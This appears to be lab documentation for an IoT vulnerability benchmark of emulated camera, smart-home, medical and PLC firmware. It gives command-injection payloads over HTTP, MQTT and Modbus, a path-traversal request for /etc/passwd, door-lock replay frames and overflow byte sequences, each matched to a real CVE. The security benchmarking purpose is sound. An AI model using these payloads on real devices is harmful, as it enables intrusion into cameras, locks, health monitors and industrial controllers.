# Native Device Scenarios and Payloads

These procedures apply only to intentionally vulnerable IoTBench images in an
isolated QEMU lab. The original CWE-78 image IDs remain in the catalog, with
their attack path adapted to each device's native service. A second set of
images provides distinct, CVE-inspired weaknesses tailored to each device
class.

## Scenario matrix

| Device | Native entry point | Vulnerable use case | Execution identity |
| --- | --- | --- | --- |
| IP camera | HTTP CGI | Apply a PTZ preset | `routerweb` |
| Smart plug | MQTT | Install a relay schedule | `root` |
| Thermostat | MQTT | Apply an HVAC profile | `root` |
| Smart bulb | MQTT | Load a lighting scene | `root` |
| Smart hub | MQTT | Restore a pairing backup | `root` |
| Environmental sensor | MQTT | Apply calibration data | `root` |
| Smart speaker | MQTT | Configure a media source | `root` |
| Health monitor | MQTT | Configure an export target | `root` |
| Door lock | MQTT | Configure a firmware URL | `root` |
| PLC | Modbus/TCP | Stage and apply a project name | `root` |

## IP camera CGI

Boot `ipcamera-cwe078-os-command-injection`, then request the native PTZ CGI.
The semicolon is URL encoded so the browser or HTTP client preserves it:

```bash
curl 'http://127.0.0.1:8080/cgi-bin/ptz.cgi?preset=home%3Bid'
```

Expected signal: the response first confirms preset `home`, then contains
`uid=995(routerweb)`. The camera snapshot and MJPEG endpoints remain available
at `/snapshot.jpg` and `/stream.cgi`.

## MQTT devices

Boot the selected firmware. `run-qemu.sh` maps host port 1883 to the broker in
the guest. Start a result subscriber in one terminal:

```bash
mosquitto_sub -h 127.0.0.1 -p 1883 -C 1 \
  -t 'iotbench/smartplug/maintenance-result'
```

Publish the malicious maintenance value from a second terminal:

```bash
mosquitto_pub -h 127.0.0.1 -p 1883 \
  -t 'iotbench/smartplug/maintenance/relay-schedule' \
  -m 'weekday-18:00; id'
```

Expected signal: the result contains `uid=0(root)`. Substitute the topic and a
plausible benign prefix for the other device profiles:

The repository also includes a dependency-free MQTT client. The equivalent
single-command test is:

```bash
python3 scripts/exploit-mqtt-maintenance.py \
  smartplug relay-schedule 'weekday-18:00; id'
```

| Firmware prefix | Request topic suffix | Example payload |
| --- | --- | --- |
| `smartplug` | `relay-schedule` | `weekday-18:00; id` |
| `thermostat` | `hvac-profile` | `eco.json; id` |
| `smartbulb` | `lighting-scene` | `evening; id` |
| `smarthub` | `pairing-backup` | `paired.tar; id` |
| `envsensor` | `calibration` | `co2-zero; id` |
| `smartspeaker` | `media-source` | `radio-local; id` |
| `healthmonitor` | `export-target` | `clinic-a; id` |
| `doorlock` | `firmware-url` | `stable.bin; id` |

The full request topic is
`iotbench/<prefix>/maintenance/<request-topic-suffix>` and the response topic
is `iotbench/<prefix>/maintenance-result`.

## PLC Modbus/TCP

Boot `plc-cwe078-os-command-injection`. `run-qemu.sh` maps host port 1502 to
guest port 502. The vulnerable vendor extension uses these holding registers:

| Registers | Purpose |
| --- | --- |
| 100-131 | Project name as packed ASCII bytes |
| 132 | Write `1` to apply the staged project |
| 140-203 | Command output as packed ASCII bytes |

The supplied standard-library client stages `baseline; id`, triggers the apply
operation and reads the result:

```bash
python3 scripts/exploit-modbus-maintenance.py
```

Expected signal: `PLC-project-applied: baseline` followed by `uid=0(root)`.
An alternative command can be passed as the third argument:

```bash
python3 scripts/exploit-modbus-maintenance.py 127.0.0.1 1502 'line-a; uname -a'
```

## CVE inspiration and scope

These are deterministic benchmark reproductions of vulnerability patterns, not
claims that IoTBench contains the vendors' original code:

- The camera CGI closely follows the pattern of
  [CVE-2024-7442](https://nvd.nist.gov/vuln/detail/CVE-2024-7442), where an IP
  camera CGI used attacker-controlled query-string data in a command.
- The MQTT agent follows the crafted-message command-injection pattern in
  [CVE-2023-24157](https://nvd.nist.gov/vuln/detail/CVE-2023-24157) and
  [CVE-2022-25137](https://nvd.nist.gov/vuln/detail/CVE-2022-25137).
- The PLC scenario combines a vendor maintenance interface with the embedded
  control-runtime command-injection pattern represented by
  [CVE-2023-6357](https://nvd.nist.gov/vuln/detail/CVE-2023-6357). Its register
  map is synthetic and should be described as CVE-inspired, not as a reproduction
  of a specific affected PLC.

For a corrected variant, authenticate and authorize the management protocol,
validate each operation against a strict schema, and call the required program
with a fixed argument vector rather than `/bin/sh -c` or `system()`.

## Device-specific CVE-inspired scenarios

Boot one image at a time with `FIRMWARE=<id> ./scripts/run-qemu.sh`. The
dependency-free client exercises the canonical payload and prints the exploit
signal:

```bash
python3 scripts/exploit-device-cve-scenarios.py <device>
```

| Firmware | Client argument | Entry point | Expected signal | Inspiration |
| --- | --- | --- | --- | --- |
| `ipcamera-cwe022-recording-path-traversal` | `ipcamera` | HTTP recording export | `/etc/passwd` contents | [CVE-2016-15055](https://nvd.nist.gov/vuln/detail/CVE-2016-15055) |
| `smartplug-cwe862-missing-authorization` | `smartplug` | MQTT relay control | `authorization=skipped` | [CVE-2023-1750](https://nvd.nist.gov/vuln/detail/CVE-2023-1750) |
| `thermostat-cwe294-command-replay` | `thermostat` | MQTT RF-frame bridge | same sequence accepted with counts 1 and 2 | [CVE-2023-46892](https://nvd.nist.gov/vuln/detail/CVE-2023-46892) |
| `smartbulb-cwe122-zcl-heap-overflow` | `smartbulb` | TCP-transposed ZCL parser | `HEAP_OVERFLOW` | [CVE-2020-6007](https://nvd.nist.gov/vuln/detail/CVE-2020-6007) |
| `smarthub-cwe121-database-stack-overflow` | `smarthub` | HTTP database lookup | `STACK_OVERFLOW` | [CVE-2018-3915](https://nvd.nist.gov/vuln/detail/CVE-2018-3915) |
| `envsensor-cwe306-unauthenticated-calibration` | `envsensor` | MQTT calibration | `authenticated=no` | [CVE-2023-23545](https://nvd.nist.gov/vuln/detail/CVE-2023-23545) |
| `smartspeaker-cwe122-id3-heap-overflow` | `smartspeaker` | TCP media parser | `HEAP_OVERFLOW` | [CVE-2025-1049](https://nvd.nist.gov/vuln/detail/CVE-2025-1049) |
| `healthmonitor-cwe200-memory-disclosure` | `healthmonitor` | patient-monitor TCP service | patient identifier and vital data | [CVE-2018-10599](https://nvd.nist.gov/vuln/detail/CVE-2018-10599) |
| `doorlock-cwe294-unlock-replay` | `doorlock` | MQTT BLE-frame bridge | same sequence accepted with counts 1 and 2 | [CVE-2018-16242](https://nvd.nist.gov/vuln/detail/CVE-2018-16242) |
| `plc-cwe121-modbus-stack-overflow` | `plc` | Modbus function `0x41` | `STACK_OVERFLOW` | [CVE-2018-20818](https://nvd.nist.gov/vuln/detail/CVE-2018-20818) |

Direct payloads, useful for packet captures and the paper:

```text
IP camera:    GET /cgi-bin/recording.cgi?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
Smart plug:   device=plug-lab-01;actor=guest;state=off
Thermostat:   seq=1042;setpoint=29.0;auth=valid-captured-frame  (send twice)
Smart hub:    bucket=<64 x "A">ROOT
Env sensor:   sensor=co2;offset=900
Door lock:    seq=7731;action=unlock;auth=valid-captured-frame (send twice)
Health:       READ 32 52
```

The smart-bulb transport begins with a two-byte big-endian length followed by
the ZCL string; `00 24` plus 36 `41` bytes overwrites the adjacent heap field.
The speaker transport is `49 44 33 44` (`ID3`, length 68) plus 68 `42` bytes.
The PLC payload is a Modbus/TCP request containing function `0x41`, byte count
36 and 36 data bytes.

BLE and Zigbee radios are not emulated by QEMU. Their application frames are
transported over MQTT or TCP while preserving replay state and parser length
semantics. This transport adaptation must be stated when describing the cases;
the benchmark does not claim to reproduce the vendors' radio stacks or code.
For MQTT scenarios other than CWE-306, broker reachability is part of the lab
harness and is treated as an attacker precondition; the measured weakness is in
the device agent's application-level authorization, replay, or parsing logic.
